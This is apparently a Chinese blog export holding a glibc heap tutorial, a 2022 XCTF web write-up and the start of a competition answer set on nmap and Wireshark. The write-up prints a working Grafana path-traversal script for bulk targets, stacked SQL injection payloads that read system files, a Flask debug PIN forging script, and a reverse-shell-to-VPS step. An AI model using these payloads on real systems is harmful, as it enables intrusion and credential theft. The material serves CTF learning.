eax 中的\n\n![](http://cdn.anyiblog.top/common/1654602221139-499b2c40-1961-4444-9de7-dcaba9912d70.jpg)\n我们这里使用下面这个命令来查看内存堆块情况：\n\n> x/32gx 0x602010-0x10\n\n*   32位的程序使用 x/32xw 比较直观一点\n    \n\n这里减去 0x10 表示从堆块的头部开始观察（包含 pre size 和 size 字段）\n\n![](http://cdn.anyiblog.top/common/1654602221529-03ab83b0-fc8c-4864-af4c-32327d89469f.jpg)\n\nmain\\_arena 与 top chunk\n-----------------------\n\n### main\\_arena \n\n这个 main\\_arena 其实就是 ptmalloc2 堆管理器通过与操作系统内核进行交互申请到的，也就是相当于上面所说的”批发”到的一堆货物\n\n> 因为是主线程分配的，所以叫做main arena，通过增加 program break location 的方式来增加 main arena 的大小。\n\n**使用 brk 方式扩展内存的方式这里就不说了，感兴趣可以自己去查一下资料**\n\n参考 ctf-wiki：\n\n[https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap\\_overview/#\\_4](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_overview/#_4)\n\n在 gdb 调试中，使用\n\n> x/32gx &main\\_arena\n\n可以看到 main\\_arena 的内存分配情况。\n\n### top chunk\n\n顾名思义，是堆中第一个堆块。相当于一个”带头大哥”，程序以后分配到的内存到要放在他的后面。\n\n在系统当前的所有 free chunk(无论那种 bin)，都无法满足用户请求的内存大小的时候，将此 chunk 当做一个应急消防员，分配给用户使用。\n\n简单点说，也就是在程序在向堆管理器申请内存时， 没有合适的内存空间可以分配给他，此时就会从 top chunk 上”剪切”一部分作为 chunk 分配给他\n\nfree 函数和 bins\n-------------\n\nbins 这个概念是与内存回收相关的，也就是堆管理器会根据用户已经申请到的内存空间大小进行释放， 来决定放入哪类 bins 当作去 。bins 直接翻译过来就是”垃圾桶”的意思，所以在系统在决定使用哪个 bins 时可以看作为”垃圾的分类”。\n\n主要的 bins 分为以下几类，这里重点讲解一下 fast bin，因为 fast bin 是使用到的最多的一类，也是其中结构最为简单的。\n\n### free 函数\n\nfree 函数的使用是和 bins 的分配息息相关的。用一个简单的例子来理解一下 free 函数的实现原理。\n\n代码如下：\n```\n#include <stdlib.h>\n#include <string.h>\n\n\nint main(){\n\t\t\n\t\tchar *p; \n\t\t\n\t\tp = malloc(10);\n\t\t\n\t\tmemcpy(p,\"Hello\",5);\n\t\tfree(p);\n\t\treturn 0;\n}\n\n```\n\n*   程序将 “Hello” 字符串复制到申请到的堆内存空间中。\n    \n\n编译后用 gdb 调试，在 call memcpy 处下一个断点，单步后将 “Hello” 复制到堆块中\n\n![](http://cdn.anyiblog.top/common/1654602221934-3145dc27-5edf-4a96-b032-c39b9f0c12ec.jpg)\n继续使用 x/32gx 0x602010-0x10 命令查看堆块情况\n\n![](http://cdn.anyiblog.top/common/1654602222534-bff0d360-f4dd-4f57-a71b-1a8350c4a3ce.jpg)\n继续单步 n，执行 free 函数之后，查看堆块情况\n\n![](http://cdn.anyiblog.top/common/1654602222945-048bd2aa-4a53-4fa7-9cd0-d896ef3bc471.jpg)\n这里可以看出原本堆块中存储的内容已经被清空，然后 **查看一下 main\\_arena 的值，发现其中 +0x8 的偏移处** ，存储了指向已经 free 了的指针（指向头部，而不是 user data）\n\n**小总结**\n\n所以调用 free 函数以后程序做了两件事：\n\n**1.清空此堆块的 user data**\n\n**2.将此堆块的指针存储到 main\\_arena 中了（或是 fast bin 中）**\n\n### fast bin\n\n顾名思义，就是为了快速重新分配回内存而存在的一个结构。\n\n> fastbin所包含chunk的大小为16 Bytes, 24 Bytes, 32 Bytes, … , 80 Bytes。当分配一块较小的内存(mem<=64 Bytes)时，会首先检查对应大小的fastbin中是否包含未被使用的chunk，如果存在则直接将其从fastbin中移除并返回；否则通过其他方式（剪切top chunk）得到一块符合大小要求的chunk并返回。\n\n引用一张图：\n\n*   这里的横向排列的就是 main\\_arene（fast bin）的内存地址\n    \n\n![](http://cdn.anyiblog.top/common/1654602223292-71512272-1e65-49a8-a9f2-31031a8094f1.jpg)\n假如此时 0x0804a000 处的堆块（实际堆块中的 size 字段要减去 PREV\\_INUSE 字段值 1，）已经被 free 了，那么他就会被存储 **在表示 40 bytes 的 fast bin 的内存地址里**\n\n*   注意： **这里把指针和地址区别开。地址存储的是指针，64 位的指针占 8 个字节** 。\n    \n\n**假设我们现在还是以 64 位下的 malloc(10) 为例子。**\n\n根据前面那个 free 函数的例子，查看 main\\_arena 地址中的指针值我们可以看出来， **+0x8 偏移处才是指向 malloc(10) 的堆块的指针** （这个堆块分配后的 user data 实际大小是 16 字节）\n\n> gdb\\-peda$ x/2gx &main\\_arena\t\t\t\t(16 bytes 的链表头)\n> 0x7ffff7dd3760 <main\\_arena>:\t\t0x0000000000000000\t\t0x0000000000602000\n\n所以这个 16 字节的堆块的指针会被插入属于他的这个链表队列中，也就是如下的情况。\n\n![](http://cdn.anyiblog.top/common/1654602223611-6e9bd73e-1638-4d4a-b432-f1e023e9f63e.jpg)\n\n所以这也就印证了在 main\\_arena 中分别表示 16 Bytes, 24 Bytes, 32 Bytes, … , 80 Bytes 的内存地址中分别存储着已经 free 的而且满足这个大小的 chunk的指针。\n\n**fast bin 的特性**\n\n**1.使用单链表来维护释放的堆块**\n\n也就是和上图一样，从main\\_arena 到 free 第一个块的地方是采用单链表形式进行存储的，若还有 free 掉的堆块，则这个堆块的 fk 指针域就会指针前一个堆块。\n\n如下图所示，此时就是一个单链表结构\n\n![](http://cdn.anyiblog.top/common/1654602223936-9f897658-8e0c-41eb-abea-bdd4145bbee3.jpg)\n\n**2.采用后进先出的方式维护链表（类似于栈的结构）**\n\n当程序需要重新 malloc 内存并且需要从fastbin 中挑选堆块时， **会选择后面新加入的堆块拿来先进行内存分配**\n\n如上图，如果程序重新请求和上面的堆块大小一样时候（malloc），堆管理器就会直接使用 fast bin 里的堆块。\n\n**这里的话也就是直接使用第二次释放的这个堆块，然后将这个堆块从链表中移除，接着根据堆块的 fk 指针找到这个堆块**，此时 main\\_arena 就指向了这里。也就是恢复到了上面第一个图中的情况。\n\n### small bin\n\n顾名思义，这个是一个 small chunk ，满足的内存空间比 fast bin 大一点。\n\n如果程序请求的内存范围不在 fast bin 的范围内，就会考虑small bin。简单点说就是大于 80 Bytes 小于某一个值时，就会选择他。\n\n### unsorted bin\n\n> 当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，堆管理器就会考虑使用 unsorted bin 。它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。\n\n*   unsorted bin 与 fast bin 不同，他使用 **双向链表** 对 chunk 进行连接\n    \n*   unsorted 的字面意思就是”不可回收”的意思，可以看作将不可回收的垃圾（不满足能够进行内存分配的堆块）都放到这个”垃圾桶”中。\n    \n\n总结\n--\n\n总之想要通透的理解堆这个概念，还是要多写一点小程序动手调试，多看看网上大牛们的文章。另外可以多逛逛一些想看雪这样的专业论坛，也可以收获到很多东西。\n\n这里只是对自己已经接触过的知识进行一些自我感觉比较通俗易懂的方式进行总结，文章中的错误在所难免，望大牛们能够谅解。","tags":["CTF","转载","教程"],"categories":["转载","CTF"]},{"title":"记2022Xctf web-WriteUp","url":"/2022/04/20/20220420/","content":"前言：\n  \n这次xctf难度确实大，misc一个不会过于真实。web倒是学到了很多东西 特别是notepro 学到了flask的pin码利用，sql堆叠注入等等。\n  \nSU战队大佬们嘎嘎带飞，师傅们tql。\n  \n总的来说还是学到很多东西的 受益匪浅\n  \nWeb\n  \noh-my-grafana\\[solved\\]\n  \n![](http://cdn.anyiblog.top/common/1650420448808-b890b723-aea1-4a89-82b7-2f44e9b686ff.jpg)  \n百度搜索了一下Grafana是一个可视化测试数据的开源程序\n  \n直接搜索Grafana的漏洞后 发现存在任意文件读取漏洞：\n  \n[https://blog.csdn.net/qq\\_36197704/article/details/123480175](https://blog.csdn.net/qq_36197704/article/details/123480175)\n  \n![](http://cdn.anyiblog.top/common/1650420450816-eec60651-59ab-42ba-b5bc-1e5ddc75baa3.jpg)  \n  \n漏洞原理大致就是通过一些插件ID路径存在目录遍历漏洞 导致了可以构造恶意url进行读取文件。\n  \nBurpsuite构造：\n  \n![](http://cdn.anyiblog.top/common/1650420452270-a4923282-8258-44bb-8957-dab5bb93ac78.jpg)  \n同时可以读取grafana的配置文件：\n![](http://cdn.anyiblog.top/common/1650420453547-de29e4fc-a7d1-41e9-a0ee-4e1cf089daa8.jpg)  \nPOC：（原脚本有些问题 修改后可以下载配置文件）\n  \n```\n#!/usr/bin/env python\n# -*- conding:utf-8 -*-\n  \n  \nimport requests\nimport argparse\nimport sys\nimport urllib3\nimport time\n  \n  \nurllib3.disable_warnings()\n  \n  \n  \n  \ndef title():\n    print(\"\"\"\n                 ___                     __                                 ___                        _      ___   _   _      \n                / __|  _ _   __ _   / _|  __ _   _ _    __ _     | _ \\  ___   __ _   __| |    | __| (_) | |  ___\n               | (_ | | '_| / _` | |  _| / _` | | ' \\  / _` |    |  / / -_) / _` | / _` |   | _|  | | | | / -_)\n               \\___| |_|   \\__,_| |_|   \\__,_| |_||_| \\__,_|  |_|_\\ \\___| \\__,_| \\__,_| |_|   |_| |_| \\___|\n  \n  \n  \n  \n  \n  \n                                     Author: Henry4E36\n               \"\"\")\n  \n  \n  \n  \nclass information(object):\n    def __init__(self, args):\n        self.args = args\n        self.url = args.url\n        self.file = args.file\n  \n  \n    def target_url(self):\n        lists = ['grafana-clock-panel', 'alertGroups', 'alertlist', 'alertmanager', 'annolist', 'barchart', 'bargauge', \\\n                 'canvas', 'cloudwatch', 'cloudwatch', 'dashboard', 'dashboard', 'dashlist', 'debug', 'elasticsearch', \\\n                 'gauge', 'geomap', 'gettingstarted', 'grafana-azure-monitor-datasource', 'grafana', 'graph',\n                 'graphite', \\\n                 'graphite', 'heatmap', 'histogram', 'influxdb', 'jaeger', 'live', 'logs', 'logs', 'loki', 'mixed', \\\n                 'mssql', 'mysql', 'news', 'nodeGraph', 'opentsdb', 'piechart', 'pluginlist', 'postgres', 'prometheus', \\\n                 'stat', 'state-timeline', 'status-history', 'table-old', 'table', 'tempo', 'testdata', 'text', \\\n                 'timeseries', 'welcome', 'xychart', 'zipkin']\n        headers = {\n            \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0\",\n        }\n  \n  \n        # proxies = {\n        #     \"http\": \"http://127.0.0.1:8080\",\n        #\n        # }\n        for i in lists:\n            target_url = self.url + f\"/public/plugins/{i}/%23/../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd\"\n            try:\n                res = requests.get(url=target_url, headers=headers, verify=False, timeout=5)\n                if res.status_code == 200 and \"root:\" in res.text:\n                    print(f\"\\033[31m[{chr(8730)}] 目标系统: {self.url}的{i}插件存在任意文件读取\\033[0m\")\n                    print(f\"[-] 尝试读取DB文件:\")\n                    db_url = self.url + f\"/public/plugins/{i}/%23/../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/var/lib/grafana/grafana.db\"\n                    try:\n                        res_db = requests.get(url=db_url, headers=headers, verify=False, timeout=25)\n                        if res_db.status_code == 200 and \"SQLite format\" in res_db.text:\n                            a = time.time()\n                            with open(f'{a}.db', \"wb\") as f:\n                                f.write(res_db.content)\n                            f.close()\n                            print(f\"\\033[31m[{chr(8730)}] 成功读取DB文件，信息保存在{a}.db文件中\\033[0m\")\n                            break\n                        else:\n                            print(f\"[-] 读取DB文件失败\")\n                    except Exception as e:\n                        print(e)\n                        print(\"[\\033[31mX\\033[0m] 读取DB文件错误,可能与请求时间有关!\")\n                        print(\"[\" + \"-\" * 100 + \"]\")\n                else:\n                    print(f\"[\\033[31mx\\033[0m]  目标系统: {self.url} 不存在{i}插件！\")\n                    print(\"[\" + \"-\" * 100 + \"]\")\n            except Exception as e:\n                print(\"[\\033[31mX\\033[0m]  连接错误！\")\n                print(\"[\" + \"-\" * 100 + \"]\")\n  \n  \n    def file_url(self):\n        with open(self.file, \"r\") as urls:\n            for url in urls:\n                url = url.strip()\n                if url[:4] != \"http\":\n                    url = \"http://\" + url\n                self.url = url.strip()\n                information.target_url(self)\n  \n  \n  \n  \nif __name__ == \"__main__\":\n    title()\n    parser = ar = argparse.ArgumentParser(description='Grafana 任意文件读取')\n    parser.add_argument(\"-u\", \"--url\", type=str, metavar=\"url\", help=\"Target url eg:\\\"http://127.0.0.1\\\"\")\n    parser.add_argument(\"-f\", \"--file\", metavar=\"file\", help=\"Targets in file  eg:\\\"ip.txt\\\"\")\n    args = parser.parse_args()\n    if len(sys.argv) != 3:\n        print(\n            \"[-]  参数错误！\\neg1:>>>python3 grafana-read.py -u [url]http://127.0.0.1[/url]\\neg2:>>>python3 grafana-read.py -f ip.txt\")\n    elif args.url:\n        information(args).target_url()\n  \n  \n    elif args.file:\n        information(args).file_url()\n```\n  \n这里的弯路就是将配置文件保存db下载后 导入sqlite等数据库软件 发现admin的password 但是有salt 所以又没有了思路\n  \n![](http://cdn.anyiblog.top/common/1650420454844-9b72c9a4-559b-43ce-8702-25256d1f658d.jpg)  \n后来发现目标靶机存在ssh服务 想通过某些用户弱口令进入 但是无果也卡了。\n  \n最后找到一篇文章 里面有讲grafana的主要文件 这里grafana.ini是关键：\n  \n[https://www.cnblogs.com/yanzi2020/p/14484227.html](https://www.cnblogs.com/yanzi2020/p/14484227.html)\n  \n![](http://cdn.anyiblog.top/common/1650420455437-f48ae717-c50b-40c0-bb26-67b11ce6efb5.jpg)  \n用burpsuite读取下 \n  \nEXP:/public/plugins/alertlist/../../../../../../../../../../../etc/grafana/grafana.ini\n  \n![](http://cdn.anyiblog.top/common/1650420457499-5214d6aa-075f-449e-be3b-74b01a0a9e6a.jpg)  \n得到密码后直接登录后台即可，这里密码就是这么长 不用反解。\n  \nadmin 5f989714e132c9b04d4807dafeb10ade\n  \n![](http://cdn.anyiblog.top/common/1650420458778-80230fd7-1540-42e9-8db8-ec1a904158f6.jpg)  \n因为环境没有docker 所以多人登录会被挤下去 多换几台靶机即可。\n  \n进来后也卡了一会儿 因为没有用过grafana 在网上找教程，大致了解可以通过mysql进行查询 但是不知道具体怎么操作\n  \n甚至想怎么通过后台去RCE hhhh\n  \n后来自己琢磨了一下 发现这个table点一下就有表：（复现的时候发现很多环境mysql都被删了 所以共用环境体验是真的不好）\n  \n![](http://cdn.anyiblog.top/common/1650420459796-7ffc3882-77d4-463a-8fa3-225e8dd248ce.jpg)  \n有了表之后编辑sql语句就行了 这里的按钮确实看不懂用不明白\n  \n  \n![](http://cdn.anyiblog.top/common/1650420460928-757131b4-0a85-4e56-a989-960d6212e648.jpg)  \n  \nSELECT \\* FROM fffffflllllllllaaaagggggg 运行即可\n![](http://cdn.anyiblog.top/common/1650420462090-86cc5e02-b435-49fd-8008-6c24624966fe.jpg)  \nFLAG:\\*ctf{Upgrade\\_your\\_grafAna\\_now!}\n  \n  \noh-my-notepro\\[unsolved\\]\n  \nsql注入 + flask debug PIN码构造\n  \n后台admin admin 登录\n  \nCreate Note 创建一条留言\n  \n![](http://cdn.anyiblog.top/common/1650420462888-69497330-3966-44fe-8312-ed5924ad1298.jpg)  \n将note\\_id改为1后报错  很明显是flask了\n  \n![](http://cdn.anyiblog.top/common/1650420464751-f1b56d83-6ffc-4224-9fbb-79e9ec5ddae2.jpg)  \n尝试sql注入：\n  \n1' or 1=1 %23\n![](http://cdn.anyiblog.top/common/1650420466361-16153fbd-fbc4-44c4-b805-b74d4ddce18a.jpg)  \n正常回显 发现是存在sql注入的 且为回显型\n  \n通过查询发现有5个字段\n  \n![](http://cdn.anyiblog.top/common/1650420467630-1ef9ab54-80cf-4f15-a8da-e52066e17a8a.jpg)  \n查询数据库：\n  \n1' union select 1,2,3,version(),database() %23\n  \n![](http://cdn.anyiblog.top/common/1650420468873-dbc5c00e-4c88-4dc9-82d1-004adbe3ec2f.jpg)  \n查询ctf表中所有表：\n  \n1' union select 1,2,3,group\\_concat(table\\_name),5 from information\\_schema.tables where table\\_schema=database() %23\n  \n![](http://cdn.anyiblog.top/common/1650420470124-a057f152-35e0-4c3c-97fc-335c089f1ad5.jpg)  \n字段：\n  \n1' union select 1,2,3,group\\_concat(column\\_name),5 from information\\_schema.columns where table\\_schema=database() and table\\_name='ctf' limit 0,1%23\n  \n当时查询的结果：\n  \nnotes id username note\\_id text title\nresult value\ntlsres100 cmd\nusers  id username password\n  \ntlsres100的内容好像是py的源码 后来就没做了。\n  \n复现的时候才发现这里sql注入不仅能查询 还存在堆叠注入 即可以创建表 - -  所以之前查询的可能都是别人创建的东西\n  \nflask的内容很多还不会，以上为我自己的做法，以下是自己参考大佬做法学到的\n  \n参考群里大佬们交流预期解应该是：\n  \n获取PIN码需要的东西，通过脚本构造flask debug的PIN码 然后就能拿到python shell 最后反弹下shell即可。\n  \n构造PIN码需要：\n  \n```\n1.flask所登录的用户名\n2.modname\n3.getattr(app, “name”, app.class.name)\n4.getattr(mod, '__file__', None) flask库下app.py的绝对路径\n5.uuid.getnode() 当前网络的mac地址的十进制数\n6.get_machine_id() docker机器id\n```\n  \n其中2.3.4都是可以默认获取的，用户名用/etc/passwd获取 mac地址用/sys/class/net/eth0/address docker的id Linux用/etc/machine-id Docker用/proc/self/cgroup\n  \n而pin码需要的东西需要用到sql注入去读取文件，这里sql注入直接是读取不到文件的，因为有堆叠注入 所以可以通过堆叠注入创建一个表 然后将需要的文件内容写到表里面 最后查询表的内容获取用户名、mac地址、docker id。最后通过脚本构造PIN 反弹shell就能拿到flag了\n  \n![](http://cdn.anyiblog.top/common/1650420471894-6d41604d-ff56-443c-b8e1-d28af0a192e4.jpg)  \n进行python shell交互模式后 开一个外网vps nc -lvvp port\n  \n这边python用socket连接ip:port\n  \n拿到shell后直接找flag即可。\n  \n实践一下：\n  \n创建表：1';create table imtest(data text);%23\n  \n添加mac地址：1';LOAD DATA LOCAL INFILE \"/sys/class/net/eth0/address\" INTO TABLE imtest;%23\n  \ndocker id（这里要/etc/machine-id + /proc/self/cgroup的id加在一起）: \n1';LOAD DATA LOCAL INFILE \"/etc/machine-id\" INTO TABLE imtest;%23\n1';LOAD DATA LOCAL INFILE \"/proc/self/cgroup\" INTO TABLE imtest;%23\n  \nusername：1';LOAD DATA LOCAL INFILE \"/etc/passwd\" INTO TABLE imtest;%23\n  \n查询: 1'union select 1,2,3,group\\_concat(data),5 from imtest %23\n  \n  \n![](http://cdn.anyiblog.top/common/1650420472847-5c526817-876b-4ed6-88e6-375e848bd5af.jpg)  \n![](http://cdn.anyiblog.top/common/1650420473855-61043cc4-5495-4dff-a93d-fdd4fbfac3ba.jpg)  \n  \n```\n02:42:ac:1c:00:03,1cc402dd0e11d5ae18db04a6de87223d,12:hugetlb:/docker/9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad,11:cpuset:/docker/9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad,10:rdma:/,9:devices:/docker/9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad,8:blkio:/docker/9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad,7:freezer:/docker/9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad,6:perf_event:/docker/9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad,5:cpu,cpuacct:/docker/9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad,4:pids:/docker/9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad,3:memory:/docker/9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad,2:net_cls,net_prio:/docker/9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad,1:name=systemd:/docker/9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad,0::/system.slice/containerd.servic\n```\n  \n```\nroot:x:0:0:root:/root:/bin/bash,daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin,bin:x:2:2:bin:/bin:/usr/sbin/nologin,sys:x:3:3:sys:/dev:/usr/sbin/nologin,sync:x:4:65534:sync:/bin:/bin/sync,games:x:5:60:games:/usr/games:/usr/sbin/nologin,man:x:6:12:man:/var/cache/man:/usr/sbin/nologin,lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin,mail:x:8:8:mail:/var/mail:/usr/sbin/nologin,news:x:9:9:news:/var/spool/news:/usr/sbin/nologin,uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin,proxy:x:13:13:proxy:/bin:/usr/sbin/nologin,www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin,backup:x:34:34:backup:/var/backups:/usr/sbin/nologin,list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin,irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin,gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin,nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin,_apt:x:100:65534::/nonexistent:/usr/sbin/nologin,ctf:x:1000:1000::/home/ctf:/bin/sh\n```\nmac地址：2485378547715\n  \n02:42:ac:1c:00:03 转换10进制\n  \n![](http://cdn.anyiblog.top/common/1650420474440-31a69cbd-2314-4ded-80ea-06eb8f53ca41.jpg)  \n/etc/machine-id：1cc402dd0e11d5ae18db04a6de87223d\n  \n/proc/self/cgroup：取 /docker/字符串后面的内容 即9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad\n  \ndocker-id = /etc/machine-id+/proc/self/cgroup = 1cc402dd0e11d5ae18db04a6de87223d9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad\n  \nusername：ctf\n  \n（可能是靶机的原因 mac地址和docker-id几分钟之后就会刷新 所以pin码可能会失效 多试试就行。）\n  \n代入脚本跑：\n  \n```\n#sha1\nimport hashlib\nfrom itertools import chain\n  \n  \ndef pin(username,mac,dockerid):\n    probably_public_bits = [\n    username,# /etc/passwd\n    'flask.app',# 默认值\n    'Flask',# 默认值\n    '/usr/local/lib/python3.8/site-packages/flask/app.py' # 报错得到\n]\n  \n  \n  \n  \n    private_bits = [\n        mac,#  /sys/class/net/eth0/address 16进制转10进制\n        dockerid#  /etc/machine-id+/proc/self/cgroup\n    ]\n  \n  \n  \n  \n    h = hashlib.sha1()\n    for bit in chain(probably_public_bits, private_bits):\n        if not bit:\n            continue\n        if isinstance(bit, str):\n            bit = bit.encode('utf-8')\n        h.update(bit)\n    h.update(b'cookiesalt')\n  \n  \n  \n  \n    cookie_name = '__wzd' + h.hexdigest()[:20]\n  \n  \n  \n  \n    num = None\n    if num is None:\n        h.update(b'pinsalt')\n        num = ('%09d' % int(h.hexdigest(), 16))[:9]\n  \n  \n  \n  \n    rv =None\n    if rv is None:\n        for group_size in 5, 4, 3:\n            if len(num) % group_size == 0:\n                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                            for x in range(0, len(num), group_size))\n                break\n        else:\n            rv = num\n  \n  \n  \n  \n    return rv\n  \n  \nif __name__ == '__main__':\n    username = \"ctf\"\n    mac = \"02:42:ac:1c:00:03\"\n    machine = \"1cc402dd0e11d5ae18db04a6de87223d\"\n    cgroup = \"9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad\"\n    dockerid = machine + cgroup\n    mac = str(int(mac.replace(':',''),16))\n    pin = pin(username,mac,dockerid)\n    print('[+] Pin: %s'%pin)\n```\n  \n684-041-847\n  \n报错后点击：\n  \n![](http://cdn.anyiblog.top/common/1650420475384-192615b1-ecac-4866-b1e7-c035cf7ec832.jpg)  \n输入：\n  \n![](http://cdn.anyiblog.top/common/1650420475998-c0f775b6-91eb-46c7-bbd5-4ff69197c634.jpg)  \nPython shell：（或访问/console）\n  \n![](http://cdn.anyiblog.top/common/1650420476805-f16667f5-0573-4066-ae32-d1671e87f62d.jpg)  \n  \n这里用os.system执行命令是无效的：\n  \n![](http://cdn.anyiblog.top/common/1650420477415-3ff83972-1795-4cab-bbf1-b071e09ee798.jpg)  \n可以用popen来执行：\n  \n![](http://cdn.anyiblog.top/common/1650420478528-962a2285-2f23-42d5-a3f9-d5a69160b497.jpg)  \nFLAG是一个可执行文件\n  \n![](http://cdn.anyiblog.top/common/1650420479093-8d75e746-b202-401b-975a-f73d42ee0d6e.jpg)  \n所以我们直接执行一下/readflag即可：\n  \n![](http://cdn.anyiblog.top/common/1650420479746-78484bb4-d81f-47a1-899b-6a9a91021913.jpg)  \n或\n  \n```\nimport os\nimport subprocess\nos.system('ls /')\n#readflag FLAG是一个可执行文件\nresult = subprocess.getstatusoutput('/readflag')\nprint(result)\n```\n  \n  \n![](http://cdn.anyiblog.top/common/1650420480452-8ecbb68a-a6aa-4654-a3ae-0e743550464d.jpg)  \nFLAG:\\*ctf{exploit\\_Update\\_with\\_Version}\n  \n参考文章：\n  \n[https://cloud.tencent.com/developer/article/1726330](https://cloud.tencent.com/developer/article/1726330)\n  \n[https://blog.csdn.net/weixin\\_46081055/article/details/120167680](https://blog.csdn.net/weixin_46081055/article/details/120167680)","tags":["刷题","CTF"],"categories":["刷题笔记","Writeup"]},{"title":"国赛十套例卷B模块总汇分析","url":"/2022/04/06/20220406/","content":"\n(部分题目无环境 都是在内网中尽量复现的)\n\n# 国赛例卷1：\n\n### B-1任务一：主机发现与信息收集\n\n\\*任务说明：仅能获取Server1的IP地址\n\n1.通过渗透机Kali2.0对靶机场景进行TCP同步扫描 (使用Nmap工具)，并将该操作使用命令中必须要使用的参数作为Flag值提交；\n\nnmap -sT 10.140.98.237\n\nFLAG:sT\n\n2.通过渗透机Kali2.0对靶机场景进行TCP同步扫描 (使用Nmap工具)，并将该操作显示结果中从下往上数第4行的服务器信息作为Flag值提交；\n\n![](http://cdn.anyiblog.top/common/1649213636317-23f4a1e4-b46e-4585-8888-8f7c81095f95.jpg)\nFLAG:rpcbind\n\n3.通过渗透机Kali2.0对靶机场景不ping主机进行扫描（使用Nmap工具），并将该操作使用命令中必须要使用的参数作为Flag值提交；\n\nnmap -Pn 10.140.98.237\n\nFLAG:Pn\n\n4.通过渗透机Kali2.0对靶机场景不ping主机进行扫描（使用Nmap工具），并将该操作显示结果中从下往上数第10行的“：”后的数字作为Flag值提交；\n\n![](http://cdn.anyiblog.top/common/1649213637019-34ed1d2f-1c3c-4894-bc23-2deeaf623f14.jpg)\nFLAG:993\n\n5.通过渗透机Kali2.0对靶机场景进行UDP扫描渗透测试只扫描53，111端口（使用Nmap工具），并将该操作显示结果中111端口的状态信息作为Flag值提交；\n\nnmap -sU -p53,111 10.140.98.237\n\n![](http://cdn.anyiblog.top/common/1649213637547-8f77f50d-0b28-4aa0-a41b-1d33033619db.jpg)\nFLAG:open|filtered\n\n6.通过渗透机Kali2.0对靶机场景进行滑动窗口扫描渗透测试（使用Nmap工具），并将该操作使用的命令中必须要使用的参数作为Flag值提交；\n\nnmap -sW 10.140.98.239\n\nFLAG:sW\n\n7.通过渗透机Kali2.0对靶机场景进行RPC扫描扫描渗透测试（使用Nmap工具）,并将该操作使用命令中必须要使用的参数作为Flag值提交；\n\nnmap -sR 10.140.98.237\n\n8.通过渗透机Kali2.0对靶机场景进行RPC扫描扫描渗透测试（使用Nmap工具）,并将该操作显示结果中从下往上数第7行的服务信息作为Flag值提交。\n\n  \n\n### B-2任务二：数据分析数字取证\n\n\\*任务说明：仅能获取Server2的IP地址\n\n1.使用Wireshark查看并分析Server2桌面下的attack.pcapng数据包文件，通过分析数据包attack.pcapng找出恶意用户的IP地址，并将恶意用户的IP地址作为Flag值（形式：\\[IP地址\\]）提交；\n\n过滤规则tcp.connection.syn\n\n![](http://cdn.anyiblog.top/common/1649213638465-990db19b-36c9-429f-948a-e564cb368982.jpg)\nFLAG:\\[172.16.1.110\\]\n\n2.继续查看数据包文件attack.pacapng，分析出恶意用户扫描了哪些端口，并将全部的端口号从低到高作为Flag值（形式：\\[端口名1，端口名2，端口名3…，端口名n\\]）提交；\n\n过滤规则tcp.connection.syn and ip.src==172.16.1.110\n\n![](http://cdn.anyiblog.top/common/1649213639860-99951fc0-1002-4a95-b09b-f82d00c857ec.jpg)\n![](http://cdn.anyiblog.top/common/1649213641007-17f5bd87-e376-4770-8e39-55750cb9d416.jpg)\nFLAG:\\[21,22,23,80,3306\\]\n\n3.继续查看数据包文件attack.pacapng分析出恶意用户最终获得的用户名是什么，并将用户名作为Flag值（形式：\\[用户名\\]）提交；\n\n字符串查找success\n\n![](http://cdn.anyiblog.top/common/1649213641935-ae6fefd0-c705-4bba-9328-1b81cb042ff1.jpg)\n追踪该流：\n\n![](http://cdn.anyiblog.top/common/1649213642357-f5cfe508-9824-433c-be1a-374571220716.jpg)\nFLAG:\\[suictsr247\\]\n\n4.继续查看数据包文件attack.pacapng分析出恶意用户最终获得的密码是什么，并将密码作为Flag值（形式：\\[密码\\]）提交；\n\n![](http://cdn.anyiblog.top/common/1649213642734-343ee021-c608-46a4-a163-0ad425884ec6.jpg)\nFLAG:\\[aaaa3b\\]\n\n5.继续查看数据包文件attack.pacapng分析出恶意用户连接一句话木马的密码是什么，并将一句话密码作为Flag值（形式：\\[一句话密码\\]）提交；\n\n过滤规则ip.addr==172.16.1.110 and 